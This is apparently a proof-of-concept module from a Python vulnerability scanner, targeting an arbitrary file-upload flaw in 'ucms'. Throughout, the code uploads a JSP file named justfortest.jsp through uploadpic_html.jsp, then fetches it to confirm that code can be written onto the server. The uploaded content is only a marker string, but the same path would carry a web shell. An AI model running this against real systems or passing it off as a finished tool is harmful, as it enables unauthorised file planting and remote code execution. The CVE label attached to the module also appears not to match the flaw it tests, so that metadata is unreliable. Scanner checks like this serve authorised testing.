#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'CVE-2015-1427'
        self.keyword = ['ucms', 'upload']
        self.info = 'ucms upload'
        self.type = VUL_TYPE.RCE
        self.level = VUL_LEVEL.HIGH
        Script.__init__(self, target=target, service_type=self.service_type)


    async def prove(self):
        await self.get_url()
        if self.base_url:
            xmldata = '''
            <?xml version="1.0" encoding="UTF-8"?>
            <root>
            dGVzdCBieSBtZQ==
            </root>
            '''
            path_list = list(set([
                self.url_normpath(self.base_url, '/'),
                self.url_normpath(self.base_url, '../ucms/'),
                self.url_normpath(self.url, 'ucms/'),
                self.url_normpath(self.url, '../ucms/'),
            ]))
            async with ClientSession() as session:
                for path in path_list:
                    myurl = path + 'cms/client/uploadpic_html.jsp?toname=justfortest.jsp&diskno=xxxx'
                    async with session.post(url=myurl, data=xmldata) as res:
                        if res != None and res.status is 200:
                            myurl = path + 'cms-data/temp_dir/xxxx/temp.files/justfortest.jsp'
                            async with session.post(url=myurl, data=xmldata) as res:
                                if res != None:
                                    text = await res.text()
                                    if 'test by me' in text:
                                        self.flag = 1
                                        self.req.append({"page": myurl})
                                        self.res.append({"info": myurl, "key": "ucms upload"})
